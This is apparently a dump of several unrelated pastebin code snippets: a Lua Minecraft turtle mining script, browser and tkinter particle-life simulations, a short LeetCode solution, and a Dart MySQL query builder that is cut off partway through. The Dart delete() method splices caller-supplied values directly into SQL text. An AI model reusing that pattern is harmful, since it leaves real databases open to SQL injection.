    local minFuelLevel = tonumber(startCoordinates.x) + tonumber(startCoordinates.y) + tonumber(startCoordinates.z) + 1
    if minFuelLevel < 100 then
        minFuelLevel = 100
    end
    if turtle.getFuelLevel() <= minFuelLevel  then
        refuelFromChest()
        checkFuel()
    end
end

function returnHome()
    goTo(startCoordinates)
    print(""Finished"")
    os.exit()
end

function refuelFromChest()
    local search = maxSlots
    if not pullInventarToChest() then
        for search = maxSlots, 3, -1 do
            turtle.select(search)
            turtle.refuel(turtle.getItemCount(search))
        end
        statusText = ""Inventar full return home""
        info()
        returnHome()
        do return end
    end
    turtle.select(2)
    turtle.place()
    turtle.select(3)
    turtle.suck()
    turtle.refuel(turtle.getItemCount(3))
    turtle.drop()
    turtle.select(2)
    turtle.dig()
end

function proofBedrockDown()
    local succes, block = turtle.inspectDown()
    if succes then
        if block.name == ""minecraft:bedrock"" then
            return true
        else
            return false
        end
    else
        return false
    end
end

function proofBedrockFront()
    local succes, block = turtle.inspect()
    if succes then
        if block.name == ""minecraft:bedrock"" then
            return true
        else
            return false
        end
    else
        return false
    end
end

function pullInventarToChest()
    local search = 0
    turtle.dig()
    turtle.dig()
    turtle.select(1)
    turtle.place()
    for search = maxSlots, 3, -1 do
        turtle.select(search)
        turtle.drop()
    end

    turtle.select(1)
    turtle.dig()

    --Wenn inventar nicht geleert werden kann zurueck zum Anfang
    if turtle.getItemCount(16) ~= 0 and turtle.getItemCount(3) ~= 0 then
        statusText = ""Inventar full return home""
        return false
    end
    return true
end

local function checkFull()
    local returnment = false
    if turtle.getItemCount(16) ~= 0 then
        returnment = not pullInventarToChest()
    end
    if returnment then
        pullInventarToChest()
    end
end

function tryForwards()
    --Nachtanken wenn ben√∂tigt
    checkFuel()
    if proofBedrockFront() then
        returnHome()
        return false
    end
    while not turtle.forward() do
        if turtle.detect() then
            if turtle.dig() then
                checkFull()
            end
        elseif turtle.attack() then
            checkFull()
            --wenn kein block vor der turtle ist dann ist es ein mob
        else
            sleep(0.5)
        end
    end

    --positionAktualisieren
    if facing == 0 then
        actualCoordinates.z = actualCoordinates.z - 1
    elseif facing == 1 then
        actualCoordinates.x = actualCoordinates.x + 1
    elseif facing == 2 then
        actualCoordinates.z = actualCoordinates.z + 1
    elseif facing == 3 then
        actualCoordinates.x = actualCoordinates.x - 1
    end

    turtle.digUp()
    turtle.digDown()
    checkFull()
    info()
    return true
end

function tryBackwards()
    checkFuel()
    if not turtle.back() then
        turtle.turnRight()
        turtle.turnRight()
        tryForwards()
        turtle.turnRight()
        turtle.turnRight()
    end
    if facing == 0 then
        actualCoordinates.z = actualCoordinates.z + 1
    elseif facing == 1 then
        actualCoordinates.x = actualCoordinates.x - 1
    elseif facing == 2 then
        actualCoordinates.z = actualCoordinates.z - 1
    elseif facing == 3 then
        actualCoordinates.x = actualCoordinates.x + 1
    end
    return true
end

function tryUpwards()
    checkFuel()
    while not turtle.up() do
        if turtle.detectUp() then
            if turtle.digUp() then
                checkFull()
            end
        elseif turtle.attackUp() then
            checkFull()
        else
            sleep(0.5)
        end
    end
    actualCoordinates.y = actualCoordinates.y +1
    return true
end

function tryDownwards()
    checkFuel()
    if proofBedrockDown() then
        returnHome()
        return false
    end
    while not turtle.down() do
        if turtle.detectDown() then
            if turtle.digDown() then
                checkFull()
            end
        elseif turtle.attackDown() then
            checkFull()
        else
            sleep(0.5)
        end
    end
    actualCoordinates.y = actualCoordinates.y -1
    return true
end

function getFacing()
    local x1, y1, z1 = gps.locate()
    sleep(0.5)
    tryForwards()
    sleep(0.5)
    local x2,y2,z2 = gps.locate()
    tryBackwards()
    if z1 > z2 then
        facing = 0    --norden
    elseif z1 < z2 then
        facing = 2    --s√ºden
    elseif x1 < x2 then
        facing = 1    --osten
    elseif x1 > x2 then
        facing = 3    --westen
    end
    sleep(0.2)
    return facing
end

function mineTurnRight()
    local neededFacing = facing + 1
    if neededFacing == 4 then
        neededFacing = 0
    end
    faceTo(neededFacing)
end

function mineTurnLeft()
    local neededFacing = facing -1
    if facing == 0 then
        neededFacing = 3
    end
    faceTo(neededFacing)
end

function mineArea(width, length, reversed)
    
    --goTo(createVector(targetX,actualCoordinates.y,targetZ))
    if (width % 2) == 1 then
        reversed = 1
    end 
    local reducedLength = length-1
    tryDownwards()
    tryUpwards()
    local startFacing = facing
    local actualWidth = 0
    while actualWidth < width do
        --print(actualWidth)
        local axis = facing % 2
        local multiplyer = -1
        if axis == 0 then
            multiplyer = 1
        end
        multiplyer = multiplyer
        local targetZ = actualCoordinates.z + (facing == 0 and (multiplyer * -reducedLength) or facing == 2 and (multiplyer * reducedLength) or 0)
        local targetX = actualCoordinates.x + (facing == 1 and (multiplyer * -reducedLength) or facing == 3 and (multiplyer * reducedLength) or 0)
        goTo(createVector(targetX,actualCoordinates.y,targetZ))
        if actualWidth < (width-1) then
            targetZ = actualCoordinates.z + (startFacing == 1 and reversed * 1 or startFacing == 3 and reversed * -1 or 0)
            targetX = actualCoordinates.x + (startFacing == 0 and reversed * 1 or startFacing == 2 and reversed * -1 or 0)
            goTo(createVector(targetX,actualCoordinates.y,targetZ))
            if actualWidth % 2 == 0 then 
                if reversed == 1 then
                    mineTurnRight()
                else
                    mineTurnLeft()
                end
            else
                if reversed == 1 then
                    mineTurnLeft()
                else
                    mineTurnRight()
                end
            end 
        end
        actualWidth = actualWidth +1
    end
    reversed = reversed * -1
    mineTurnRight()
    mineTurnRight()
    local x1, y1, z1 = gps.locate(5)
    actualCoordinates = createVector(x1,y1,z1)
    goTo(createVector(x1,y1-3,z1))
    mineArea(width,length,reversed)
end

function info()
	term.clear()
	term.setCursorPos(1, 1)
	print(""---------------------------------------"")
	print(""-----------Made by IdZero------------"")
	print(""---------------------------------------"")
	print(""Mining size: "" .. rows + 1 .. "" by "" .. columns + 1)
	print("""")
	print(""X: "" .. actualCoordinates.x .. "" Y: "" .. actualCoordinates.y .. "" Z: "" .. actualCoordinates.z)
    print(""Fuel level: "" .. turtle.getFuelLevel())
    print("""")
    --print(""Status: "" .. statusText)
end


if #args == 2 then
	columns = tonumber(args[1])-1
	rows = tonumber(args[2])-1
end

if columns == 0 then
	term.clear()
	term.setCursorPos(1, 1)
	io.write(""Width: "")
	columns = tonumber(io.read()) -1
end

if rows == 0 then
	term.clear()
	term.setCursorPos(1, 1)
	io.write(""Depth: "")
	rows = tonumber(io.read()) -1
end

term.clear()
term.setCursorPos(1, 1)


while turtle.getItemCount(1) ~= 1 do
	term.setCursorPos(1, 1)
	print(""pleas place a enderchest with clear invertory into the first slot"")
	sleep(5)
end
while turtle.getItemCount(2) ~= 1 do
	term.setCursorPos(1, 1)
	print(""pleas place a enderchest with coal in it into the second slot"")
	sleep(5)
end
local x, y, z = gps.locate(5)
if not x then
    print(""Missing GPS"")
else
    startCoordinates = createVector(x,y,z)
    actualCoordinates = createVector(x,y,z)
    print(tostring(startCoordinates.x) .. ""|"" .. tostring(startCoordinates.y) .. ""|"" .. tostring(startCoordinates.z))
    getFacing()
    print(facing)
    faceTo(0)
    --actualCoordinates.x = actualCoordinates.x +1
    --print(tostring(startCoordinates.x) .. ""|"" .. tostring(startCoordinates.y) .. ""|"" .. tostring(startCoordinates.z))
    --print(tostring(actualCoordinates.x) .. ""|"" .. tostring(actualCoordinates.y) .. ""|"" .. tostring(actualCoordinates.z))
    --goTo(createVector(125,89,177))
    --print(tostring(actualCoordinates.x) .. ""|"" .. tostring(actualCoordinates.y) .. ""|"" .. tostring(actualCoordinates.z))
    mineArea(columns,rows,1)
    --tryForwards()
end
--initilise()"
gj8CE2ZR,particle_life.html,here2share,JavaScript,Monday 24th of June 2024 12:56:37 PM CDT,"<html>
<title>Life</title>

<head>

    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">

    <style>
        :root {
            color-scheme: dark;
            --canvas-bg-color: rgba(0, 0, 0, 0); /* transparent */
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
        }

        #canvas {
            border: #504e52;
            border-style: dashed;
            border-width: 5;
            outline: none;  /* because of the 'tabindex' focus trick */
            background-color: var(--canvas-bg-color);
        }
    </style>
</head>

<body>
    <!-- 'tabindex' is a trick to make the canvas capture key events -->
    <canvas id=""canvas"" tabindex=""1""></canvas>

    <script src=""https://cdn.jsdelivr.net/npm/lil-gui@0.17""></script>

    <script>
        const maxRadius = 200;
        const maxClusters = 20;
        const minClusterSize = 50;
        const predefinedColors = ['green', 'red', 'orange', 'cyan', 'magenta', 'lavender', 'teal'];
        const settings = {
            seed: 91651088029,
            fps: 0,
            atoms: {
                count: 500,  // Per Color
                radius: 1,
            },
            drawings: {  // Drawing options can be expensive on performance
                lines: false,   // draw lines between atoms that arr effecting each other
                circle: false,  // draw atoms as circles
                clusters: false,
                background_color: '#000000', // Background color
            },
            export: {
                // Export a Screenshot image
                image: () => {
                    const imageDataURL = canvas.toDataURL({
                        format: 'png',
                        quality: 1
                    });
                    dataURL_downloader(imageDataURL);
                },
                // Export a video recording
                video: () => {
                    mediaRecorder.state == 'recording' ? mediaRecorder.stop() : mediaRecorder.start();
                },
            },
            explore: false,
            explorePeriod: 100,
            rules: {},
            rulesArray: [],
            radii: {},
            radii2Array: [],
            colors: [],
            numColors: 4,
            time_scale: 1.0,
            viscosity: 0.7,  // speed-dampening (can be >1 !)
            gravity: 0.0,  // pulling downward
            pulseDuration: 10,
            wallRepel: 40,
            reset: () => {
                randomAtoms(settings.atoms.count, true)
            },
            randomRules: () => {
                settings.seed = local_seed   // last used seed is the new starting seed
                startRandom()
            },
            symmetricRules: () => {
                symmetricRules()
                randomAtoms(settings.atoms.count, true)
                updateGUIDisplay()
            },
            gui: null,
        }

        const setupClicks = () => {
            canvas.addEventListener('click',
                (e) => {
                    pulse = settings.pulseDuration;
                    if (e.shiftKey) pulse = -pulse;
                    pulse_x = e.clientX;
                    pulse_y = e.clientY;
                }
            )
        }
        const setupKeys = () => {
            canvas.addEventListener('keydown',
                function (e) {
                    console.log(e.key)
                    switch (e.key) {
                        case 'r':
                          settings.randomRules()
                        break;
                        case 't':
                          settings.drawings.clusters = !settings.drawings.clusters
                        break;
                        case 'o':
                          settings.reset()
                        break;
                        case 's':
                          settings.symmetricRules()
                        break;
                        default:
                          console.log(e.key)
                    }
                })
        }
        const updateGUIDisplay = () => {
            console.log('gui', settings.gui)
            settings.gui.destroy()
            setupGUI()
        }
        Object.defineProperty(String.prototype, 'capitalise', {
            value: function() {
                return this.charAt(0).toUpperCase() + this.slice(1);
            },
            enumerable: false
        })

        // Build GUI
        const setupGUI = () => {
            settings.gui = new lil.GUI()
            // Configs
            const configFolder = settings.gui.addFolder('Config')
            configFolder.add(settings, 'reset').name('Reset')
            configFolder.add(settings, 'randomRules').name('Random Rules')
            configFolder.add(settings, 'symmetricRules').name('Symmetric Rules')
            configFolder.add(settings, 'numColors', 1, 7, 1).name('Number of Colors')
                .listen().onFinishChange(v => {
                    setNumberOfColors();
                    startRandom();
                })
            configFolder.add(settings, 'seed').name('Seed').listen().onFinishChange(v => {
                startRandom();
            })
            configFolder.add(settings, 'fps').name('FPS - (Live)').listen().disable()
            configFolder.add(settings.atoms, 'count', 1, 1000, 1).name('Atoms per-color').listen().onFinishChange(v => {
                randomAtoms(v, true)
            })
            configFolder.add(settings, 'time_scale', 0.1, 5, 0.01).name('Time Scale').listen()
            configFolder.add(settings, 'viscosity', 0.1, 2, 0.1).name('Viscosity').listen()

            configFolder.add(settings, 'gravity', 0., 1., 0.05).name('Gravity').listen()
            configFolder.add(settings, 'pulseDuration', 1, 100, 1).name('Click Pulse Duration').listen()

            configFolder.add(settings, 'wallRepel', 0, 100, 1).name('Wall Repel').listen()
            configFolder.add(settings, 'explore').name('Random Exploration').listen()
            // Drawings
            const drawingsFolder = settings.gui.addFolder('Drawings')
            drawingsFolder.add(settings.atoms, 'radius', 1, 10, 0.5).name('Radius').listen()
            drawingsFolder.add(settings.drawings, 'circle').name('Circle Shape').listen()
            drawingsFolder.add(settings.drawings, 'clusters').name('Track Clusters').listen()
            drawingsFolder.add(settings.drawings, 'lines').name('Draw Lines').listen()
            drawingsFolder.addColor(settings.drawings, 'background_color').name('Background Color').listen()
            // Export
            const exportFolder = settings.gui.addFolder('Export')
            exportFolder.add(settings.export, 'image').name('Image')
            exportFolder.add(settings.export, 'video').name('Video: Start / stop')
            // Colors
            for (const atomColor of settings.colors) {
                const colorFolder =
                    settings.gui.addFolder(`Rules: <font color=\'${atomColor}\'>${atomColor.capitalise()}</font>`)
                for (const ruleColor of settings.colors) {
                    colorFolder.add(settings.rules[atomColor], ruleColor, -1, 1, 0.001)
                         .name(`<-> <font color=\'${ruleColor}\'>${ruleColor.capitalise()}</font>`)
                         .listen().onFinishChange(v => { flattenRules() }
                    )
                }
                colorFolder.add(settings.radii, atomColor, 1, maxRadius, 5).name('Radius')
                    .listen().onFinishChange(v => { flattenRules() }
                )
            }


        }


        // Seedable 'decent' random generator
        var local_seed = settings.seed;
        function mulberry32() {
            let t = local_seed += 0x6D2B79F5;
            t = Math.imul(t ^ t >>> 15, t | 1);
            t ^= t + Math.imul(t ^ t >>> 7, t | 61);
            return ((t ^ t >>> 14) >>> 0) / 4294967296.;
        }

        function loadSeedFromUrl() {
            let hash = window.location.hash;
            if (hash != undefined && hash[0] == '#') {
                let param = Number(hash.substr(1)); // remove the leading '#'
                if (isFinite(param)) {
                    settings.seed = param;
                    console.log(""Using seed "" + settings.seed);
                }
            }
        }

        function randomRules() {
            if (!isFinite(settings.seed)) settings.seed = 0xcafecafe;
            window.location.hash = ""#"" + settings.seed;
            document.title = ""Life #"" + settings.seed;
            local_seed = settings.seed;
            console.log(""Seed="" + local_seed);
            for (const i of settings.colors) {
                settings.rules[i] = {};
                for (const j of settings.colors) {
                    settings.rules[i][j] = mulberry32() * 2 - 1;
                }
                settings.radii[i] = 80;
            }
            console.log(JSON.stringify(settings.rules));
            flattenRules()
        }

        function symmetricRules() {
            for (const i of settings.colors) {
                for (const j of settings.colors) {
                    if (j < i) {
                        let v = 0.5 * (settings.rules[i][j] + settings.rules[j][i]);
                        settings.rules[i][j] = settings.rules[j][i] = v;
                    }
                }
            }
            console.log(JSON.stringify(settings.rules));
            flattenRules()
        }

        function flattenRules() {
            settings.rulesArray = []
            settings.radii2Array = []
            for (const c1 of settings.colors) {
                for (const c2 of settings.colors) {
                    settings.rulesArray.push(settings.rules[c1][c2])
                }
                settings.radii2Array.push(settings.radii[c1] * settings.radii[c1])
            }
        }

        function updateCanvasDimensions() {
            canvas.width = window.innerWidth * 0.9;
            canvas.height = window.innerHeight * 0.9;
        }

        // Initiate Random locations for Atoms ( used when atoms created )
        function randomX() {
            return mulberry32() * (canvas.width - 100) + 50;
        };

        function randomY() {
            return mulberry32() * (canvas.height - 100) + 50;
        };

        /* Create an Atom - Use matrices for x4/5 performance improvement
        atom[0] = x
        atom[1] = y
        atom[2] = ax
        atom[3] = ay
        atom[4] = color (index)
        */
        const create = (number, color) => {
            for (let i = 0; i < number; i++) {
                atoms.push([randomX(), randomY(), 0, 0, color])
            }
        };

        function randomAtoms(number_of_atoms_per_color, clear_previous) {
            if (clear_previous) atoms.length = 0;
            for (let c = 0; c < settings.colors.length; c++) {
                create(number_of_atoms_per_color, c)
            }
            clusters.length = 0;
        }

        function startRandom() {
            randomRules();
            randomAtoms(settings.atoms.count, true);
            updateGUIDisplay()
        }

        function setNumberOfColors() {
            settings.colors = [];
            for (let i = 0; i < settings.numColors; ++i) {
                settings.colors.push(predefinedColors[i]);
            }
        }

        // Run Application
        loadSeedFromUrl()

        // Canvas
        const canvas = document.getElementById('canvas');
        const m = canvas.getContext(""2d"");
        // Draw a square
        const drawSquare = (x, y, color, radius) => {
            m.fillStyle = color;
            m.fillRect(x - radius, y - radius, 2 * radius, 2 * radius);
        }

        // Draw a circle
        function drawCircle(x, y, color, radius, fill = true) {
            m.beginPath();
            m.arc(x, y, radius, 0 * Math.PI, 2 * Math.PI);  // x, y, radius, ArcStart, ArcEnd
            m.closePath();
            m.strokeStyle = m.fillStyle = color;
            fill ? m.fill() : m.stroke()
        };

        // Draw a line between two atoms
        function drawLineBetweenAtoms(ax, ay, bx, by, color) {
            m.beginPath();
            m.moveTo(ax, ay);
            m.lineTo(bx, by);
            m.closePath();
            m.strokeStyle = color;
            m.stroke();
        };

        // [position-x, position-y, radius, color]
        //    /* tmp accumulators: */
        //  {count, accum-x, accum-y, accum-d^2, accum-color}]
        let clusters = [];
        function newCluster() {
            return [randomX(), randomY(), maxRadius, 'white'];
        }
        function addNewClusters(num_clusters) {
            if (clusters.length < num_clusters / 2) {
                while (clusters.length < num_clusters) clusters.push(newCluster());
            }
        }
        function findNearestCluster(x, y) {
            let best = -1;
            let best_d2 = 1.e38;
            for (let i = 0; i < clusters.length; ++i) {
                const c = clusters[i];
                const dx = c[0] - x;
                const dy = c[1] - y;
                const d2 = dx * dx + dy * dy;
                if (d2 < best_d2) {
                    best = i;
                    best_d2 = d2;
                }
            }
            return [best, best_d2];
        }
        function moveClusters(accums) {
            let max_d = 0.;   // record max cluster displacement
            for (let i = 0; i < clusters.length; ++i) {
                let c = clusters[i];
                const a = accums[i];
                if (a[0] > minClusterSize) {
                    const norm = 1. / a[0];
                    const new_x = a[1] * norm;
                    const new_y = a[2] * norm;
                    max_d = Math.max(max_d, Math.abs(c[0] - new_x), Math.abs(c[1 ] - new_y));
                    c[0] = new_x;
                    c[1] = new_y;
                }
            }
            return max_d;
        }
        function finalizeClusters(accums) {
            for (let i = 0; i < clusters.length; ++i) {
                let c = clusters[i];
                const a = accums[i];
                if (a[0] > minClusterSize) {
                    const norm = 1. / a[0];
                    const new_r = 1.10 * Math.sqrt(a[3] * norm);  // with 10% extra room
                    c[2] = 0.95 * c[2] + 0.05 * new_r;  // exponential smoothing
                    // 'average' color
                    c[3] = settings.colors[Math.floor(a[4] * norm + .5)];
                } else {
                    c[2] = 0.;   // disable the weak cluster
                }
            }
            // note: if half of the particles are not within the average
            // radius of the cluster, we should probably split it in two
            // along the main axis!
        }
        function trackClusters() {
            addNewClusters(maxClusters);
            let accums = [];
            for (const c of clusters) accums.push([0, 0., 0., 0., 0]);
            const maxKMeanPasses = 10;
            for (let pass = maxKMeanPasses; pass >= 0; --pass) {
                for (let a of accums) a = [0, 0., 0., 0., 0];
                for (const c of atoms) {
                    const [best, best_d2] = findNearestCluster(c[0], c[1]);
                    if (best >= 0 && best_d2 < maxRadius * maxRadius) {
                        accums[best][0] += 1;
                        accums[best][1] += c[0];
                        accums[best][2] += c[1];
                        accums[best][3] += best_d2;
                        accums[best][4] += c[4];
                    }
                }
                const max_d = moveClusters(accums);
                if (max_d < 1.) break;
            }
            finalizeClusters(accums);
        }
        function drawClusters() {
            let i = 0;
            while (i < clusters.length) {
                let c = clusters[i];
                if (c[2] > 0.) {
                    drawCircle(c[0], c[1], c[3], c[2], false);
                    ++i;
                } else {
                    // remove cluster by swapping with last
                    const last = clusters.pop();
                    if (i < clusters.length) clusters[i] = last;
                }
            }
        }

        // Canvas Dimensions
        updateCanvasDimensions()


        // Params for click-based pulse event
        var pulse = 0;
        var pulse_x = 0,
            pulse_y = 0;

        var exploration_timer = 0;
        function exploreParameters() {
            if (exploration_timer <= 0) {
                let c1 = settings.colors[Math.floor(mulberry32() * settings.numColors)];
                if (mulberry32() >= 0.2) {  // 80% of the time, we change the strength
                  let c2 = settings.colors[Math.floor(mulberry32() * settings.numColors)];
                  let new_strength = mulberry32();
                  // for better results, we force opposite-signed values
                  if (settings.rules[c1][c2] > 0) new_strength = -new_strength;
                  settings.rules[c1][c2] = new_strength;
                } else {  // ...otherwise, the radius
                  settings.radii[c1] = 1 + Math.floor(mulberry32() * maxRadius);
                }
                flattenRules();
                exploration_timer = settings.explorePeriod;
            }
            exploration_timer -= 1;
        }

        var total_v; // global velocity as a estimate of on-screen activity

        // Apply Rules ( How atoms interact with each other )
        const applyRules = () => {
            total_v = 0.;
            // update velocity first
            for (const a of atoms) {
                let fx = 0;
                let fy = 0;
                const idx = a[4] * settings.numColors;
                const r2 = settings.radii2Array[a[4]]
                for (const b of atoms) {
                    const g = settings.rulesArray[idx + b[4]];
                    const dx = a[0] - b[0];
                    const dy = a[1] - b[1];
                    if (dx !== 0 || dy !== 0) {
                        const d = dx * dx + dy * dy;
                        if (d < r2) {
                            const F = g / Math.sqrt(d);
                            fx += F * dx;
                            fy += F * dy;

                            // Draw lines between atoms that are effecting each other.
                            if (settings.drawings.lines) {
                                drawLineBetweenAtoms(a[0], a[1], b[0], b[1], settings.colors[b[4]]);
                            }
                        }
                    }
                }
                if (pulse != 0) {
                    const dx = a[0] - pulse_x;
                    const dy = a[1] - pulse_y;
                    const d = dx * dx + dy * dy;
                    if (d > 0) {
                        const F = 100. * pulse / (d * settings.time_scale);
                        fx += F * dx;
                        fy += F * dy;
                    }
                }
                if (settings.wallRepel > 0) {
                  const d = settings.wallRepel
                  const strength = 0.1
                  if (a[0] <                d) fx += (d -                a[0]) * strength
                  if (a[0] > canvas.width - d) fx += (canvas.width - d - a[0]) * strength
                  if (a[1] <                 d) fy += (d                 - a[1]) * strength
                  if (a[1] > canvas.height - d) fy += (canvas.height - d - a[1]) * strength
                }
                fy += settings.gravity;
                const vmix = (1. - settings.viscosity);
                a[2] = a[2] * vmix + fx * settings.time_scale;
                a[3] = a[3] * vmix + fy * settings.time_scale;
                // record typical activity, so that we can scale the
                // time_scale later accordingly
                total_v += Math.abs(a[2]);
                total_v += Math.abs(a[3]);
            }
            // update positions now
            for (const a of atoms) {
                a[0] += a[2]
                a[1] += a[3]

                // When Atoms touch or bypass canvas borders
                if (a[0] < 0) {
                    a[0] = -a[0];
                    a[2] *= -1;
                }
                if (a[0] >= canvas.width) {
                    a[0] = 2 * canvas.width - a[0];
                    a[2] *= -1;
                }
                if (a[1] < 0) {
                    a[1] = -a[1];
                    a[3] *= -1;
                }
                if (a[1] >= canvas.height) {
                    a[1] = 2 * canvas.height - a[1];
                    a[3] *= -1;
                }

            }
            total_v /= atoms.length;
        };


        // Generate Rules
        setNumberOfColors()
        randomRules()

        // Generate Atoms
        const atoms = []
        randomAtoms(settings.atoms.count, true)


        setupClicks()
        setupKeys()
        setupGUI()

        console.log('settings', settings)

        // Update Frames
        var lastT = Date.now();
        update();

        function update() {
            // Update Canvas Dimensions - if screen size changed
            updateCanvasDimensions()
            // Background color
            m.fillStyle = settings.drawings.background_color;
            m.fillRect(0, 0, canvas.width, canvas.height);
            // Appy Rules
            applyRules();
            // Draw Atoms
            for (const a of atoms) {
                if (settings.drawings.circle) {
                    drawCircle(a[0], a[1], settings.colors[a[4]], settings.atoms.radius);
                } else {
                    drawSquare(a[0], a[1], settings.colors[a[4]], settings.atoms.radius);
                }
            }
            if (settings.drawings.clusters) {
                trackClusters();
                drawClusters();
            }

            updateParams();

            // const inRange = (a) => 0 <= a[0] && a[0] < canvas.width && 0 <= a[1] && a[1] < canvas.height
            // console.log('inRange', atoms.filter(inRange).length)

            requestAnimationFrame(update);
        };

        // post-frame stats and updates
        function updateParams() {
            // record FPS
            var curT = Date.now();
            if (curT > lastT) {
                const new_fps = 1000. / (curT - lastT);
                settings.fps = Math.round(settings.fps * 0.8 + new_fps * 0.2)
                lastT = curT;
            }

            // adapt time_scale based on activity
            if (total_v > 30. && settings.time_scale > 5.) settings.time_scale /= 1.1;
            if (settings.time_scale < 0.9) settings.time_scale *= 1.01;
            if (settings.time_scale > 1.1) settings.time_scale /= 1.01;

            if (pulse != 0) pulse -= (pulse > 0) ? 1 : -1;
            if (settings.explore) exploreParameters();
        }


        
        // Download DataURL
        function dataURL_downloader(dataURL, name = `particle_life_${settings.seed}`) {
            const hyperlink = document.createElement(""a"");
            // document.body.appendChild(hyperlink);
            hyperlink.download = name;
            hyperlink.target = '_blank';
            hyperlink.href = dataURL;
            hyperlink.click();
            hyperlink.remove();
        };


        // Recorde a video ----------------------------------
        // Stream
        const videoStream = canvas.captureStream();
        // Video Recorder
        const mediaRecorder = new MediaRecorder(videoStream);
        // temp chunks
        let chunks = [];
        // Store chanks
        mediaRecorder.ondataavailable = function (e) {
            chunks.push(e.data);
        };
        // Download video after recording is stopped
        mediaRecorder.onstop = function (e) {
            // Chunks ---> Blob
            const blob = new Blob(chunks, { 'type': 'video/mp4' });
            // Blob -----> DataURL
            const videoDataURL = URL.createObjectURL(blob);

            // Download video
            dataURL_downloader(videoDataURL);

            // Reset Chunks
            chunks = [];
        };
        
        // mediaRecorder.start(); // Start recording
        // mediaRecorder.stop(); // Stop recording
        // --------------------------------------------------
    </script>

</body>

</html>"
kH20JzHp,Algoverse_adesh_26,kucheasysa,Python,Monday 24th of June 2024 12:35:27 PM CDT,"class Solution:
    def isToeplitzMatrix(self, matrix: List[List[int]]) -> bool:
        for i in range(len(matrix) - 1):
            for j in range(len(matrix[i]) - 1):
                if matrix[i][j] != matrix[i+1][j+1]:
                    return False
        return True"
0BGQc8Pk,# tk_particle_life.py,here2share,Python,Monday 24th of June 2024 12:21:27 PM CDT,"# tk_particle_life.py

import tkinter as tk
from PIL import Image, ImageTk, ImageDraw
import random
import math
import time

atoms = []
window_size = 600
g = 0.1
cell_size = 20
cells = {}

def atom(x, y, c):
    return {""x"": x, ""y"": y, ""vx"": 0, ""vy"": 0, ""color"": c}

def randomxy():
    return round(random.random() * window_size + 1)

def cxy(a):
    return int(a[""x""] // cell_size), int(a[""y""] // cell_size)

def create(number, color):
    group = []
    for i in range(number):
        a = atom(randomxy(), randomxy(), color)
        cx, cy = cxy(a)
        key = (cx, cy)
        group.append(a)
        atoms.append(a)
        add_to_cell(a, cx, cy, key)
    return group

def add_to_cell(a, cx, cy, key):
    if key not in cells:
        cells[key] = []
    cells[key].append(a)

def remove_from_cell(a, cx, cy, key):
    if key in cells and a in cells[key]:
        cells[key].remove(a)

def update_cells():
    for a in atoms:
        cx, cy = cxy(a)
        key = (cx, cy)
        remove_from_cell(a, cx, cy, key)
        add_to_cell(a, cx, cy, key)

def rule(atoms1, atoms2, g):
    for i in range(len(atoms1)):
        fx = 0
        fy = 0
        a = atoms1[i]
        cx, cy = cxy(a)
        for dx in range(-1, 2):
            for dy in range(-1, 2):
                nx, ny = cx + dx, cy + dy
                key = (nx % (window_size // cell_size), ny % (window_size // cell_size))
                if key in cells:
                    for b in cells[key]:
                        dx = a[""x""] - b[""x""]
                        dy = a[""y""] - b[""y""]
                        dx = dx - round(dx / window_size) * window_size
                        dy = dy - round(dy / window_size) * window_size
                        d = (dx * dx + dy * dy) ** 0.5
                        if d > 0 and d < 100:
                            F = (g + g) / d
                            fx += F * dx
                            fy += F * dy
        a[""vx""] = (a[""vx""] + fx) * 0.5
        a[""vy""] = (a[""vy""] + fy) * 0.5
        a[""x""] = (a[""x""] + a[""vx""] * 0.07) % window_size
        a[""y""] = (a[""y""] + a[""vy""] * 0.07) % window_size

def draw_atom(x, y, color):
    draw.line([x, y, x - 1, y + 1], fill=color, width=3)

def set_gravity():
    for i in range(6):
        gravity[i] = gravity[i, 'f'] * random.uniform(1, 2.999) 
        print(round(gravity[i], 4), end=', ')
    print('\n')

gravity = {}
t = 0.6, -1.5, 0.9, -1.4, 1.0, -3.2
for i in range(6):
    gravity[i, 'f'] = t[i]
set_gravity()
green = create(123, ""green"")
yellow = create(99, ""yellow"")
red = create(79, ""red"")

root = tk.Tk()
root.title(""tk_particle_life.py"")
root.geometry(f""{window_size}x{window_size}+10+10"")
label = tk.Label(root)
label.pack()

delay = 10
t = time.time() + delay
while True:
    rule(red, red, gravity[0])
    rule(red, yellow, gravity[1])
    rule(yellow, yellow, gravity[2])
    rule(green, green, gravity[3])
    rule(green, red, gravity[4])
    rule(green, yellow, gravity[5])
        
    update_cells()
    img = Image.new(""RGB"", (window_size + 10, window_size + 10), ""black"")
    draw = ImageDraw.Draw(img)
    for i in range(len(atoms)):
        draw_atom(atoms[i][""x""], atoms[i][""y""], atoms[i][""color""])
    img_tk = ImageTk.PhotoImage(img)
    label.config(image=img_tk)
    if time.time() > t:
        t = time.time() + delay
        set_gravity()
    root.update()
"
yh3JQd4u,MySqlCommand For dart,Genral,Dart,Monday 24th of June 2024 12:01:05 PM CDT,"import 'package:mysql1/mysql1.dart';
import 'dart:async';

enum MySqlCommandType { delete, insert, select, update, count }

class MySqlCommand {
  MySqlCommandType type;
  StringBuffer _command = StringBuffer();
  List<MySqlParameter> _parameters = [];
  bool firstPart = true;
  Map<int, String> insertFields = {};
  Map<int, String> insertValues = {};
  int lastpair = 0;

  MySqlCommand(this.type) {
    switch (type) {
      case MySqlCommandType.select:
        _command.write('SELECT * FROM <R>');
        break;
      case MySqlCommandType.update:
        _command.write('UPDATE <R> SET ');
        break;
      case MySqlCommandType.insert:
        _command.write('INSERT INTO <R> (<F>) VALUES (<V>)');
        break;
      case MySqlCommandType.delete:
        _command.write('DELETE FROM <R> WHERE <C> = <V>');
        break;
      case MySqlCommandType.count:
        _command.write('SELECT count(<V>) FROM <R>');
        break;
    }
  }

  bool _comma() {
    if (firstPart) {
      firstPart = false;
      return false;
    }
    return _command.toString().endsWith(',');
  }

  MySqlCommand select(String table) {
    _command = StringBuffer(_command.toString().replaceAll('<R>', '`$table`'));
    return this;
  }

  MySqlCommand delete(String table, String column, Object value) {
    _command = StringBuffer(_command.toString().replaceAll('<R>', '`$table`')
        .replaceAll('<C>', '`$column`')
        .replaceAll('<V>', value is String ? ""'$value'"" : value.toString()));
    return this;
  }

  MySqlCommand update(String table) {
    _command = StringBuffer(_command.toString().replaceAll('<R>', '`$table`'));
    return this;
  }

  MySqlCommand set(String column, Object value) {
    if (type == MySqlCommandType.update) {
      String parameterPlaceholder = '@$column';
      if (_comma()) {
        _command.write(', `$column` = $parameterPlaceholder ');
      } else {
